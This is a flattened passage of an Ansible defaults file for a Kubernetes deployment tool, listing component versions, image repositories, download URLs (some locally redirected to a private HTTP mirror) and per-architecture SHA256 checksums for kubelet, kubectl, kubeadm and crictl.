validation.download_validate_certs:true# Use the first kube-master if download_localhost is not setdownload_delegate:\u0026#34;{% if download_localhost %}localhost{% else %}{{ groups[\u0026#39;kube-master\u0026#39;][0] }}{% endif %}\u0026#34;# Arch of Docker images and needed packagesimage_arch:\u0026#34;{{host_architecture | default(\u0026#39;amd64\u0026#39;)}}\u0026#34;# Versions# add by wangb#kube_version: v1.18.10kube_version:v1.20.1kubeadm_version:\u0026#34;{{ kube_version }}\u0026#34;# add by wangb#etcd_version: v3.4.3etcd_version:v3.4.13# gcr and kubernetes image repo definegcr_image_repo:\u0026#34;gcr.io\u0026#34;kube_image_repo:\u0026#34;k8s.gcr.io\u0026#34;# docker image repo definedocker_image_repo:\u0026#34;docker.io\u0026#34;# quay image repo definequay_image_repo:\u0026#34;quay.io\u0026#34;# TODO(mattymo): Move calico versions to roles/network_plugins/calico/defaults# after migration to container downloadcalico_version:\u0026#34;v3.15.2\u0026#34;calico_ctl_version:\u0026#34;{{ calico_version }}\u0026#34;calico_cni_version:\u0026#34;{{ calico_version }}\u0026#34;calico_policy_version:\u0026#34;{{ calico_version }}\u0026#34;calico_typha_version:\u0026#34;{{ calico_version }}\u0026#34;typha_enabled:falseflannel_version:\u0026#34;v0.12.0\u0026#34;cni_version:\u0026#34;v0.8.7\u0026#34;weave_version:2.7.0pod_infra_version:\u0026#34;3.2\u0026#34;contiv_version:1.2.1cilium_version:\u0026#34;v1.8.3\u0026#34;kube_ovn_version:\u0026#34;v1.3.0\u0026#34;kube_router_version:\u0026#34;v1.0.1\u0026#34;multus_version:\u0026#34;v3.6\u0026#34;ovn4nfv_ovn_image_version:\u0026#34;v1.0.0\u0026#34;ovn4nfv_k8s_plugin_image_version:\u0026#34;v1.1.0\u0026#34;# Get kubernetes major version (i.e. 1.17.4 =\u0026gt; 1.17)kube_major_version:\u0026#34;{{ kube_version | regex_replace(\u0026#39;^v([0-9])+\\\\.([0-9]+)\\\\.[0-9]+\u0026#39;, \u0026#39;v\\\\1.\\\\2\u0026#39;) }}\u0026#34;crictl_supported_versions:# add by wangbv1.20:\u0026#34;v1.20.1\u0026#34;v1.19:\u0026#34;v1.19.0\u0026#34;v1.18:\u0026#34;v1.18.0\u0026#34;v1.17:\u0026#34;v1.17.0\u0026#34;crictl_version:\u0026#34;{{ crictl_supported_versions[kube_major_version] }}\u0026#34;# Download URLs#kubelet_download_url: \u0026#34;https://storage.googleapis.com/kubernetes-release/release/{{ kube_version }}/bin/linux/{{ image_arch }}/kubelet\u0026#34;#kubectl_download_url: \u0026#34;https://storage.googleapis.com/kubernetes-release/release/{{ kube_version }}/bin/linux/{{ image_arch }}/kubectl\u0026#34;#kubeadm_download_url: \u0026#34;https://storage.googleapis.com/kubernetes-release/release/{{ kubeadm_version }}/bin/linux/{{ image_arch }}/kubeadm\u0026#34;#etcd_download_url: \u0026#34;https://github.com/coreos/etcd/releases/download/{{ etcd_version }}/etcd-{{ etcd_version }}-linux-{{ image_arch }}.tar.gz\u0026#34;#cni_download_url: \u0026#34;https://github.com/containernetworking/plugins/releases/download/{{ cni_version }}/cni-plugins-linux-{{ image_arch }}-{{ cni_version }}.tgz\u0026#34;#calicoctl_download_url: \u0026#34;https://github.com/projectcalico/calicoctl/releases/download/{{ calico_ctl_version }}/calicoctl-linux-{{ image_arch }}\u0026#34;#crictl_download_url: \u0026#34;https://github.com/kubernetes-sigs/cri-tools/releases/download/{{ crictl_version }}/crictl-{{ crictl_version }}-{{ ansible_system | lower }}-{{ image_arch }}.tar.gz\u0026#34;# add by wangb start#kubelet_download_url: \u0026#34;http://192.168.182.131:8989/files/kubernetes/v1.20.1/kubelet\u0026#34;#kubectl_download_url: \u0026#34;http://192.168.182.131:8989/files/kubernetes/v1.20.1/kubectl\u0026#34;#kubeadm_download_url: \u0026#34;http://192.168.182.131:8989/files/kubernetes/v1.20.1/kubeadm\u0026#34;kubelet_download_url:\u0026#34;http://10.151.11.61:8989/files/kubernetes/v1.20.1/kubelet\u0026#34;kubectl_download_url:\u0026#34;http://10.151.11.61:8989/files/kubernetes/v1.20.1/kubectl\u0026#34;kubeadm_download_url:\u0026#34;http://10.151.11.61:8989/files/kubernetes/v1.20.1/kubeadm\u0026#34;etcd_download_url:\u0026#34;https://github.com/coreos/etcd/releases/download/{{ etcd_version }}/etcd-{{ etcd_version }}-linux-{{ image_arch }}.tar.gz\u0026#34;#cni_download_url: \u0026#34;http://192.168.182.131:8989/files/kubernetes/v1.20.1/cni-plugins-linux-{{ image_arch }}-{{ cni_version }}.tgz\u0026#34;#calicoctl_download_url: \u0026#34;http://192.168.182.131:8989/files/kubernetes/v1.20.1/calicoctl-linux-{{ image_arch }}\u0026#34;cni_download_url:\u0026#34;http://10.151.11.61:8989/files/kubernetes/v1.20.1/cni-plugins-linux-{{ image_arch }}-{{ cni_version }}.tgz\u0026#34;calicoctl_download_url:\u0026#34;http://10.151.11.61:8989/files/kubernetes/v1.20.1/calicoctl-linux-{{ image_arch }}\u0026#34;crictl_download_url:\u0026#34;https://github.com/kubernetes-sigs/cri-tools/releases/download/{{ crictl_version }}/crictl-{{ crictl_version }}-{{ ansible_system | lower }}-{{ image_arch }}.tar.gz\u0026#34;# add by wangb endcrictl_checksums:arm:v1.19.0:b72fd3c4b35f60f5db2cfcd8e932f6000cf9c2978b54adfcf60ee5e2d452e92fv1.18.0:d420925d10b47a234b7e51e9cf1039c3c09f2703945a99435549fcdd7487ae3av1.17.0:9700957218e8e7bdc02cbc8fda4c189f5b6223a93ba89d876bdfd77b6117e9b7arm64:v1.19.0:ec040d14ca03e8e4e504a85dae5353e04b5d9d8aea3df68699258992c0eb8d88v1.18.0:95ba32c47ad690b1e3e24f60255273dd7d176e62b1a0b482e5b44a7c31639979v1.17.0:d89afd89c2852509fafeaff6534d456272360fcee732a8d0cb89476377387e12amd64:v1.19.0:87d8ef70b61f2fe3d8b4a48f6f712fd798c6e293ed3723c1e4bbb5052098f0aev1.18.0:876dd2b3d0d1c2590371f940fb1bf1fbd5f15aebfbe456703ee465d959700f4av1.17.0:7b72073797f638f099ed19550d52e9b9067672523fc51b746e65d7aa0bafa414# Checksumskubelet_checksums:arm:v1.19.3:3c0214d2d583440233b6bd0088614fe4fb5748e5b153f2ec96d72d3f8165e214v1.19.2:631e686c34911a40a798817dcff89532c88bb649885f93ec66b339e227ebd974v1.19.1:3985c8d02c1c2f2016fceccd9cc14865e2d047f32c8f0b42aeedcc8450de572ev1.19.0:bb433ef7981297bdee6ffc4e23376e8db24a0e47321ebe94bf9d4b9f7a2f0e3bv1.18.10:716b8a1971d2f96b28f31a65e6769e2ce60979703d143a67d340c7ce16137db5v1.18.9:24f7559fe5214b5f3b625ab035e29159441e6cfd248befbeb78b63e660fccd23v1.18.8:831f50ea45384884c50395c288d493e75dd134a962dc95261ce122de5e6a17ecv1.18.6:5f8367f9f5de77c022ec5d0cd86e897b7a33318185eaadb7736033d8dabcdbdbv1.18.5:9f8ab727964c6f42f1c17089bf2f7b4b2f2a5c61ffab3bad16eb02d9feb05855v1.18.4:796defe5f8b43a5316a487a377b4059df12b9b3c933f3fe4dff40e8144a11af6v1.18.3:491344027cbec40bc867a79c7130c27c143648544b5dfe4a28929cf26427dc3bv1.18.2:b7b9c43851dde9cbaa2061828410c60ee63e53fbf3ebc5559b7f4387dae67bb9v1.18.1:04d8e0a080dcb23d579c69e769e75bd5abaa1977d43550ec891560d76f1f7f37v1.18.0:985c1a1b492ccc6e46e1cd454790dae539d5b93208efb05e35114f66a183de99v1.17.13:f98d4eaf65c65bce55479b1435baa032944856c098ccf8038a8aca318c530f24v1.17.12:2b6160f5c15b1294573e37031ce0bcbbcd3ee3ea055f4f8fe4faf3ab74774f40v1.17.11:53784f9bea1508b6d82f8be6f40af2e6aef86381021b500c1647f9d297af3efdv1.17.9:37fc89360f4dcff4788032e60fe6388da4194a68503992868261ba840413e8d4v1.17.8:82320569bc9deff33d148c759a105f1a32de3d83855165100261a4ad395d1845v1.17.7:3b368039523357959e451a35867b5659701e135ca2069cb9487c7459084c46d9v1.17.6:e522cda9b86de29da72fd306968e1ba44cb85b61a743083f8fee39899a755210v1.17.5:d1eb5b7a3a88030490f1619f2e7d723926214ba941e2172112bccb71f41d9aabv1.17.4:c8c4d1b869c72b4203024615cafae1cca7df2fb89dd7f4a524d05ffa5edde559v1.17.3:06fe53b9780e4fa17b5e14f588bbaaa09fc0924ef4040e26a484fa3235c9e110v1.17.2:9a2ab021f8556fabcb00022052810b3d8136704141891439de1340ac9e439d6dv1.17.1:0219c940bad3238dfbdf8e4518241d861bbdd8fc93d172cc632c225d7dd57094v1.17.0:75ae6ad8f4a7f2ac3988b37a01c28093f240745d17c1781135d1844057c8ae94arm64:v1.19.3:228695df98c5cb8a5f64d1235021f54a482a8e63f5b9b1b2addfc95df9b671eev1.19.2:86b9336aa7f6215e6f9b387bb82105657668aa8a38b0e0f7c2e647ef45c1b723v1.19.1:143bed1f04cba4e6749a72abf9258d19f31e1a310f94bd041cd30ce62a1f73ffv1.19.0:d8fa5a9739ecc387dfcc55afa91ac6f4b0ccd01f1423c423dbd312d787bbb6bfv1.18.10:1490550560b9afcb6e74d5bd69d61ae60dabe466e05e0408da48f17b4ccd91b4v1.18.9:21b0fb4682deea19be3ac160403db9858dc9d02b101d60eb6fc22a86523ec434v1.18.8:d36e2d656bad232e8b48b19c948164ee3966669f4566cf5ea43ca22f6eed1aa5v1.18.6:257fd42be375025fb93724bda9bef23b73eb40531f22bab9e19f6d6ff1ca57cfv1.18.5:c3815bc740755aa9fd3ec240ad808a13628a4deb6ec2b4338e772fd0cf77e1a2v1.18.4:ec4e18e7a2e94fb1ca83d739eadb8d81748cf6a48b87b8fe0d66131e9515e8c6v1.18.3:f88deee2052b4d1e3a15fd7352b93728c23d69497a4199a56e62fa871bdf7edbv1.18.2:89b5066ae17df8488c76a83c70cbcac0771fa36803e31b826f2770b5efcdbfbfv1.18.1:2181cde9e6b24055d262b78758b365363273896968df673eb13d4f17a4f69c4av1.18.0:db91a26f8baa2bce017172305e717e77be5cfc4272592be8cb0155e1cfa7719ev1.17.13:e9396034d079d3574370faf47eba78055cf8fb897093929e796f571cf2f91cd6v1.17.12:bfd5ff97040a2f1017bc14991757ba62ad8c8218d75a5f646690c1e76f93bf22v1.17.11:0d9705c284054b2fdb7627d4867edd0863f67a2fbf64a2e1710d928936539c89v1.17.9:d57c25a3d67c937a9d6778de07295478185f73938937868525030a01d15c372fv1.17.8:673355f62aa422915682ae595e4e53813e4656f2c272eb032f97492211cfced5v1.17.7:eb1715a745281f6aee34644653f73787acdd9f3904e3d58e1319ded4a16be013v1.17.6:6ded412f13e5d8bd0368372150334580a05cd4dc7629f437c789a5aa6008e8e5v1.17.5:9220a7390d9c5cb5c770d947babdec288d044126b9982bbd5d5c8785354a6701v1.17.4:77ca08cd3d03edda8d628e39a8cb45afe794582a9619d381ec5a70585999721av1.17.3:eeefd2f966dfb75ab4ab58829118f9bb314b75799a94d21c2ce8d083cc330dbcv1.17.2:133b69346da8e34daaf20f421657625a06630ec1e11f06961523836383cea72cv1.17.1:c773512ade5da3188ed4c312d5ba01bfbf3f376f6e580e5b074827a5b25450aav1.17.0:b1a4a2325383854a69ec768e7dc00f69378d3ccbc554859d910bf5b582264ea2amd64:v1.19.3:daa02a34efd936bf9940d9c52fe24c299fc36ba4b31a051968efb3652f289fa9v1.19.2:7ff6d3663e8de0c654909e7a279e386286aa7ed3fc262d021bed77c92d62780fv1.19.1:2ca2a3104d4cce26db128e3a0b7a042385df4f2c51bdbe740e067fdfaa2fcdd1v1.19.0:3f03e5c160a8b658d30b34824a1c00abadbac96e62c4d01bf5c9271a2debc3abv1.18.10:8daecd339993342c0693b6cb8a8e053d4a21d2d829389cc7ab823f52ea0589a1v1.18.9:5028b6548e8838e1e0851f10e8bd8d9a6ef1693e3f1dac09f7d50c4c2873f20bv1.18.8:a4116675ac52bf80e224fba8ff6db6f2d7aed192bf6fffd5f8e4d5efb4368f31v1.18.6:2eb9baf5a65a7b94c653dbd7af03a768a520961eb27ef369e43ef12711e22d4av1.18.5:8c328f65d30f0edd0fd4f529b09d6fc588cfb7b524d5c9f181e36de6e494e19cv1.18.4:42bcd6a8fe1abeab12cbe9be0f16d4a7b15017937a5de66eb67a38073de7eb72v1.18.3:6aac8853028a4f185de5ccb5b41b3fbd87726161445dee56f351e3e51442d669v1.18.2:bc13d29b58300c328f0078c7f72e37e1254c4303277348862af1e7f2b356b9e3v1.18.1:4c5737235e62a5bb0b5d3f51939ccd255ebda376d75941222b25241251b67fbcv1.18.0:3a90e7abf9910aebf9ef5845918c665afd4136a8832604ccfabca2defb35ce0fv1.17.13:e71c3ce50f93abc2735ba601781355d86a49aec992e8cb235a369254c304fa7dv1.17.12:196263deb2605507ff137b3edea39a914e7047f4c4de0a681c4a6f8dcfa5fe65v1.17.11:71bcc8443a6e6f226727ea007fdc4b96327e302d1724a15ce2bffc2d94a3dac6v1.17.9:3b6cdfcd38a646c7b553821ef9bb67e93541da658305c00705e6ab2ba15e73afv1.17.8:b39081fb40332ae12d262b04dc81630e5c6550fb196f09b60f3d726283dff17fv1.17.7:a6b66c94a37dd6ae830a9af5b9200884a2c0af868096a3c2553b2e876723c2a2v1.17.6:4b7fd5123bfafe2249bf91ed83469c2655a8d3295966e5fbd952f89b64b75f57v1.17.5:c5fbfa83444bdeefb51934c29f0b4b7ffc43ce5a98d7f957d8a11e3440055383v1.17.4:f3a427ddf610b568db60c8d47565041901220e1bbe257614b61bb4c76801d765v1.17.3:a5c2349c61771f8bf9f80feb174f7e9d9a6c9e79559758ea538ed3dead07bdcbv1.17.2:33c6befab43ace4c4e89eab9c45d0cea5432f3cea4beaa956c786fe521f844bbv1.17.1:ffd04d1934c193fa63b3fc7d285d3646ed215f07f726390eefb0913b810716c3v1.17.0:c2af77f501c3164e80171903028d35c632366f53dec0c8419828d4e55d86146fkubectl_checksums:arm:v1.19.3:fb611ff64139bc8712fe93497f2419c236d62c5f689e1cb4cc68037fda698f82v1.19.2:c8cad74a586dfee41436ce866c91d79c9d2053468eccde9fed976cdf32b7849fv1.19.1:e63bbf3161c49d60e46ffaf7d3cfd689834516205be1be881d2e652115535e93v1.19.0:5885bb723a55ab95e8687e0ad52620ce4c08f76fd20c0973f5cd19c753b513c8v1.18.10:3d5b7cb1c54d5e9dec157a512d2d21dddc6b9fd5b9a0b8df9493553871d21668v1.18.9:8f49ade7875aaca82f7471901963796815b786d5437e6af0ae4d6d784dc92c08v1.18.8:21769e01e17f3809d0e9188a88a71fb1f479dfeeb22590e56006d5dbb3689605v1.18.6:1b6668bae432a3c6034f2fe83e72b2db5ea794a02121cf0a22be7f4bd8f460bfv1.18.5:5fc8dc6e3d09ceaf900dd06b9af3a7abb291293cea5219aea577bad852aa84b1v1.18.4:9617b1a929aad7e3bf9f1151f83548e5e3f89175f5d3f961733b8b0ec2e376c4v1.18.3:1816364467b98e7ae52731f593780f392d6835d33db5b12a671abfffb72a4eacv1.18.2:353d61297cfbf01ed3f72b7df1658110c065355d670556ea3bdbf0d1b2824aeav1.18.1:896c90b1b9d88e121876d93718591f3ecbab880b304767806c6c9fcb3b145805v1.18.0:34fc6d16c2f535ed381b5fd3a4d40b642fff4f9ff95f8250b8043a29b8c062b9v1.17.13:1053624c88881d1fe9d8f2adbb07831fc23c829127b8466da9b15cc122004344v1.17.12:e3bfbb4a82183c094a6538ffe4e837856cb3849ed1348d23830f0945852a81e4v1.17.11:e8178745c3010a57de068138e63bf19087ca4f83acfdc1df82f7844ce73cf3bev1.17.9:4bcad42cb8721bcb636f88e02f143fa9e2ad8141a37025f7622bd04516dab391v1.17.8:e1a75ee55e1270583143422cc611547623aeef2c69689354c69b0b8f445cf6bav1.17.7:1b862c79333b7edee64f0317f8c5de8699f99b00709734e3341d41cca3b8f29bv1.17.6:2ad9897b84dd503c963ff790ce092aeb4c8e78ac64b7986a6c6ed1c601255419v1.17.5:470139a2ca98a85ab89210d07dc733d457d48a8419bbf038ee7e55276e2b5c35v1.17.4:bec3f4163231d4df62ef75b1e435f646b576bfeff08a5e635a033c8223fb4c52v1.17.3:740e17e7fa2b6aed243e690cdb939f040aefe644a485429ed42b2b1fa7eac813v1.17.2:152e5b5e1a744ad8e4860bef212462750e0a38856990d6a4d0b3418bedb5346fv1.17.1:a1e580e9140536c4a370c207ee66481cfe8d8876dc9021755a9d20232a97033dv1.17.0:594b3e2f89dca09d82b176b51bf6c8c0fa524ed209c14ec915c9b36fa876601darm64:v1.19.3:a4f2e2dbdcead30eed5aa47468e669b9574fd99457b860679eba84e1cb9cf863v1.19.2:a460f918c03e5cd916f4ac28da137596232e344cc0755d4ceb222fc4cd203e09v1.19.1:332bbdb4560f9b7fcbb96c8f2cebbc4996e409384ca07510e5c5990998158c20v1.19.0:d4adf1b6b97252025cb2f7febf55daa3f42dc305822e3da133f77fd33071ec2fv1.18.10:394fa475f7688778eeeecb31e01acfae4cc37a72926d9bf33290c968e6dc037av1.18.9:9f466ff8d40097914a1ded0288ef8b9eb6f4ad39a9990cb2c0f8d1a710013a4fv1.18.8:9046c4086528427462544e1a6dcbe709de4d7ae44d1a155375de330fecd067b1v1.18.6:7b3d6cc019747a7ee5f6cc2b187423daaac4e153140cb290e60d316c3f456430v1.18.5:28c1edb2d76f80e70e10fa8cd2a30b9fccc5f003d8b3e853535d8317db7f424av1.18.4:61c5004f6e9040163bc09459a11fd17b0f9ff55d7ba8f9b1e89368b5f2cdf072v1.18.3:fc4479d1f7e58e6c8f40430a35f6b09b6f582909f69968e424fc20640ac45dafv1.18.2:8d4bd6a716e32187e03c5998b4d9570f3b2eb9fb041ac9ed6e9728f04935c2fbv1.18.1:39e9645c6bed1e7340b3d764db983b9fc35326b11325fd509c3660c9f55469edv1.18.0:0de307f90502cd58e5785cdcbebeb552df81fa2399190f8a662afea9e30bc74dv1.17.13:9d62bb6f21a64fd464237b7c81e45075e2ce0a83b6e13c54a6539c076f3b536fv1.17.12:22f383cef1a429cab5d4c98df6704295722044613dbea49c306e931d383d723fv1.17.11:8eb18f37148d2786205bc70dded66c173df7517577e5ae024a19e72400263ed2v1.17.9:4d818e97073113eb1e62bf97d63876757be0f273c47807c09f34511155e25afdv1.17.8:4dfd36dbd637b8dca9a7c4e789fb3fe4ca420062c90d3a872ae751dfb9777cb6v1.17.7:00c71ceffa9b50af081d2838b102be49ca224a8aa928f5c948b804af84c58818v1.17.6:ceccf6ef3e0ac523cb75d46d1b4979ae1f8cf199926244a9d828cb77f024e46bv1.17.5:160d1198a6da3eb082e197e368ba86c2acce435e073e9f3ee271aa59c7fb47d6v1.17.4:95867f3c977b1f754223b95dbb04a9ff45613529e9e4691ffa45c6b214f9fd4fv1.17.3:d007a212240fef9fee30c59b4d4203bbc463d334f679c4d0d1af521b7e2c42e6v1.17.2:29c36d5866a76ca693a255567ac26d7558c1f02e6b840895093e47afe06594d9v1.17.1:4208be10e2c12b67e71219cd39b0b2ab065d4ec1b26e19c5da88cb8ebc64ea2fv1.17.0:cba12bfe0ee447b06f00813d7d4ba3fbdbf5116eccc4d3291987044f2d6f93c2amd64:v1.19.3:84eeb8237448e4f431fef0f0ec0ba8b07558d8e52d5a7e89b4ae64dadcffbe66v1.19.2:f51adfe7968ee173dbfb3dabfc10dc774983cbf8a3a7c1c75a1423b91fda6821v1.19.1:da4de99d4e713ba0c0a5ef6efe1806fb09c41937968ad9da5c5f74b79b3b38f5v1.19.0:79bb0d2f05487ff533999a639c075043c70a0a1ba25c1629eb1eef6ebe3ba70fv1.18.10:b25c445cb36ab168de590c13b50bced4e7877ed15ca899a261053b4ba3ba1456v1.18.9:6a68756a2d3d04b4d0f52b00de6493ba2c1fcb28b32f3e4a0e99b3d9f6c4e8edv1.18.8:a076f5eff0710de94d1eb77bee458ea43b8f4d9572bbb3a3aec1edf0dde0a3e7v1.18.6:62fcb9922164725c7cba5747562f2ad2f4d834ad0a458c1e4c794cc203dcdfb3v1.18.5:69d9b044ffaf544a4d1d4b40272f05d56aaf75d7e3c526d5418d1d3c78249e45v1.18.4:5fea9ad294ea73f952243178db5340dc29c14ad96aed3f92a18deedb73f221ecv1.18.3:6fcf70aae5bc64870c358fac153cdfdc93f55d8bae010741ecce06bb14c083eav1.18.2:6ea8261b503c6c63d616878837dc70b758d4a3aeb9996ade8e83b51aedac9698v1.18.1:f5144823e6d8a0b78611a8d12e7a25202126d079c3a232b18f37e61e872ff563v1.18.0:bb16739fcad964c197752200ff89d89aad7b118cb1de5725dc53fe924c40e3f7v1.17.13:25824bf20d8d9501e9b6cabdd6bd25ec10cc649d4e3155dba86037f57bba842ev1.17.12:d6472a5f5d3ff125b4a1aa5cefd6197faadfb578c36f639240a04df1a71597e1v1.17.11:002d640a12d6fad48f7d8a5c56cb4ff656397caf3511f50426d9c69c94b2d137v1.17.9:2ca83eecd221bedf3eceb0ccfcf45bb2e27950c382c2326211303adb0a9c4232v1.17.8:01283cbc2b09555cbf2a71c162097552a62a4fd48a0a4c06e34e9b853b815486v1.17.7:7124a296518edda2ae326e754aec9be6d0ac86131e6f61b52f5ecaa413b66ae4v1.17.6:5e245f6af6fb761fbe4b3ac06b753f33b361ce0486c48c85b45731a7ee5e4ccav1.17.5:03cd1fa19f90d38005148793efdb17a9b58d01dedea641a8496b9cf228db3ab4v1.17.4:465b2d2bd7512b173860c6907d8127ee76a19a385aa7865608e57a5eebe23597v1.17.3:ae8627adb1f0ae7bdb82ffd74a579953b8acdcd4b94aeefc7569078c3d7994c6v1.17.2:7732548b9c353114b0dfa173bc7bcdedd58a607a5b4ca49d867bdb4c05dc25a1v1.17.1:a87a0acdc67d066bc331cb96c7fd29a883d67a41beeef538a0bd2878872ebad9v1.17.0:6e0aaaffe5507a44ec6b1b8a0fb585285813b78cc045f8804e70a6aac9d1cb4ckubeadm_checksums:arm:v1.19.3:522358c8596d10cac1a04a9e52f0ae59a1c06ca122292429d36773e7f6ad0a01v1.19.2:effc35d1e3ab01ac80185ff9f7ca5afabbb94f5f91d7326b04b09e903315647dv1.19.1:0e910cf9c771976f6eb079098ad428f3e99080624f478e3d71b670005a7c3651v1.19.0:62fca8b373f8c63409bcfcb7c585f8de882a8a119d88d39666e1ab3a11be188bv1.18.10:49f53573bdefd4ed37376800119b082666d03d5657d5886a4caa35e63a11d658v1.18.9:026cd1ec3b75703994254ae44998a544f46723b424775218f90c07754bb42bb6v1.18.8:52ec1a5d8a6826762c112d55734e35cf895a02e746b8d6ca4a9c942289aab077v1.18.6:84abadc0abc01970ee73bf25078b2120a0725e4afcb9bb8c0d03077c978d7452v1.18.5:461641c8fb8db2afe6e103aca925a4ef9d161dcae08a96fc24674b0ea0122e04v1.18.4:0a8a021cb3d18295f53843b1ab7d2d8bf9b861d5d6bd160f24717d22aa5a8fa7v1.18.3:88b8004dcfbf8862e5ae4dadcd4e4ef86c91211e48cd45922d5a18634b06d1b3v1.18.2:c3558beca26c1b970cee8419dcf24f9812483f6ef384cea9a704491bc3af1e2cv1.18.1:4f919ad7215209dee97ea4c61668e44a2cce8f575b9cf4032e47f0c377924854v1.18.0:0f05bd526bb38be11459675c69bc882a2d3e583e48339fab49b620d292c2433ev1.17.13:086de433c9e77d37a6fd38fca059b7ab4cae9d0a3e57350d245f753cb391cec0v1.17.12:c18a1c4aa3788c8e860a8653987bd50df9f2da70e15e5a4e1cce6f9a4bee4831v1.17.11:df79e696668290091cf93b4c68ff614b3886cecbe40dbf76fdfff799ba41901dv1.17.9:69c28a8e35394cf72b3926bb557724b7d0c5bbd07a22fdd9c207b943b4c617b3v1.17.8:1e8e653a07438131126f62b853b442356b341d2950f0d7c30d2a96e773a54611v1.17.7:47c911a7deff993e654da1e0644fe627e496292d7a7a5f43f33fa4cde6b6856dv1.17.6:a12f4281d018a7d53611cb1c0c537cd8f82dc01f3e16c16513622c1d6c9db658v1.17.5:ae2b66de65a6a435ff06ea8e542904e92c5eec0c42c2e57905a2a31a52106ca1v1.17.4:d22dd143947aa442812b325f36d48929506ea8416230213ffb83c29c1c1222f5v1.17.3:fc94d273927bc7e1dce91518133492f4e76aead6e795338317281fb0c6b6445ev1.17.2:c0a74989da367d9c11b25d4fbd90e8d3d1a013a63c9be7bbce61b320715c1a83v1.17.1:501d1bacb863713dd9d0101d0021b0227869c4b1b9e903f6498333c613d384e1v1.17.0:5fcf1234d89bc2a364c53b76b36134fc57278b456138d93c278805f2c9b186f1arm64:v1.19.3:c398c23019f988514ac0f2c1e32a388cf11ca9d48634530092dbf54d9e00eaa6v1.19.2:b6900a44558ba1a0a364406e2072163f5fc561030da97045e1403cdc69ff2682v1.19.1:dcdabd2fdec9b4dd8febd1625e1fbbe15362919041e5f4ce3aab629e4aea7540v1.19.0:db1c432646e6e6484989b6f7191f3610996ac593409f12574290bfc008ea11f5v1.18.10:dc4a2daa3bf3e652fc7a81f5b449752c08e6a91e27aa1bbffad7ade35508a77bv1.18.9:c17e29b8cec1892b6cd72aed1af6d9abfd39816c222d3cc5c97c6637a284162dv1.18.8:71f6d95f165a9e8066c6f299217af779829ab3d798f6130caf6daa4784dc0464v1.18.6:df5a3d7c70c3f8221d57093c5cb17558aad6e65725d7a096c6620302fbf64730v1.18.5:0e2a9de622177015c2514498382b0d821ac8f71c7ed5f02e5684d456ff3c0e4dv1.18.4:67feef5289663ac1bf7c3ab6bdc2d5ac2f24e9ca5ddad82129fd8ea1f9c8b747v1.18.3:6a6fda8e2abdaed05f9df16528c8c0ae59cbe89fbda467cce204bf548965863fv1.18.2:e5a1f738443c15f5f8f3b316c6c7f8038f84f24b5d4bf2eef5bee39ca208952av1.18.1:0cb6589d9b4c09b007eae977ab8a185fc4140eda886408dced4f500a508e4e83v1.18.0:2ef1785159c80a9acd454a1c8be3c6b8db2260200b22e4359426e709ff786d01v1.17.13:eb84d8cd772a02c6db35ffd77f2ee2703db5b92571f9b7c8c30108ee7bb35b0av1.17.12:fb2f090c4bd62229a738b8e1faa81bd3b01252a49351464a1e1be9fe689ab959v1.17.11:0875b49d7eacb80db3b9a375086a091304420c875ae8b54191ed9aa0af4c54e3v1.17.9:b56dc03177636fdafb4f8ab329d087b804cb7395c142f76e8246e86083c6d750v1.17.8:5a52e7d0306890e68ed66fc47ecd70bf14628c70527442fd0cd2973dbde7064cv1.17.7:6c8622adf5a7a2dfc66ebe15058353b2e2660b01f1e8990bab7a9c7fca76bccbv1.17.6:b9f20f98aeecc7b011727ff8be9008a8229cdbea6d3dd93f782622c306306288v1.17.5:6f004152ca1f60bb6ac7446e2c317957df5cff5ac55b60c08ce7869792dc4196v1.17.4:20e1e095f8c46e5dba6366eec162a40b22cd7639f32e83743afef3c0daafd127v1.17.3:92d584c2ff83790830384159fbf6d04798eea002d6315923657fd6f74c80f092v1.17.2:091864574d38d3e30ed57734419b55d0957f39291d6f573ff8fffc8d474fb9ecv1.17.1:c640eb50406962628ac6e31fd840506a360b5d9c57d14007d0eaada28c49d64fv1.17.0:0b94d1ace240a8f9995358ca2b66ac92072e3f3cd0543275b315dcd317798546amd64:v1.19.3:0a7581fdebe05fb101ce30d4e1f85e865e18f5c034e4f7cc785c786e861f9be2v1.19.2:377dbf06469709aafb7a9a6c925e890bf48727b905455c2a81fee28727716f2fv1.19.1:d5afcf4ff916b4c6810f10f76176c73238f0854b7748b2cde8afbd91de65a3c9v1.19.0:88ce7dc5302d8847f6e679aab9e4fa642a819e8a33d70731fb7bc8e110d8659fv1.18.10:9bf46e5276bc14d42d6dcf05ac507bb3236ce8dc0fa21aad985d9328c377c18dv1.18.9:3f7f61e0fe3de43f5b345343f85d7ba5145737efb80974baa6076965f3a6963ev1.18.8:27c8f4d4398d57762998b157d35802a36a7ea9b2b6f9a363c397a9d65b4f3c89v1.18.6:11b4180b9f82a8b6bb30250e3d7341b104521f3b654076b8569853ec9451b2a9v1.18.5:e428fc9d1cf860090346a83eb66082c3be6b6032f0db9e4f8e6d52492d46231fv1.18.4:cec00c2629805b660b5f41b13292dfe75cbd3803e57a1ded53def912fedb1a22v1.18.3:a60974e9840e006076d204fd4ddcba96213beba10fb89ff01882095546c9684dv1.18.2:290bb6acb12c844f76affbab1ce374903bd97c4f19ac8cd3e6fdb7208d638ac8v1.18.1:fdb194647048f3e3ebdc93613b21a5b678fcbe0d212d08c0d56758d1bf2d2c85v1.18.0:0261331c2ea718c0cd39114871aa098f1b4685f6101cb78cc880f645e72d0654v1.17.13:eaea610b88369dfd46aaaaad343865f5ef2e5bffe97dda9638adb467d86cd5cdv1.17.12:214f547788410a643d57aee8215d99f44ebe59967e973f83b024e2ba7832593fv1.17.11:328ca55af305fef59e72544d0faf76167b5b5dc5779cec17c670961e6529d907v1.17.9:5ef1660d3d56e93e3d87d6a7028aa64745984be0b0678c45c32f66043b4d69b4v1.17.8:c59b85696c4cbabe896ba71f4bbc99e4ad2444fcea851e3ee740705584420aadv1.17.7:9d4b97e93ddb204798b91fec063743e218c92b42798779b5248a49e1476226e2v1.17.6:d4cfc9a0a734ba015594974ee4253b8965b95cdb6e83d8a6a946675aad418b40v1.17.5:9bd2fd1118b3d07d12e2a806c04bf34d99e79886c5318ddc003ba38f30da390cv1.17.4:3cdcffcf8a1660241a045cfdfed3ebbf7f7c6a0840f008e2b049b533bca5bb8cv1.17.3:e34e3193a1161aea7269cee3f115e86ff71f01702a1c15fa0f71103bf2dba304v1.17.2:33a1d8e3cea2bdbb9fa9cb257c516289ee50d957fcb6d7b35919f5f0e6ca2f41v1.17.1:11bd31833dab9adb5b53398772dd1582264c3d1757cb3395e691d6a7379081ecv1.17.0:0d8443f50fb7caab2e5e7e53f9dc56d5ffe55f021ec061f2e2bcba0481df5a48etcd_binary_checksums:# Etcd does not have arm32 builds at the 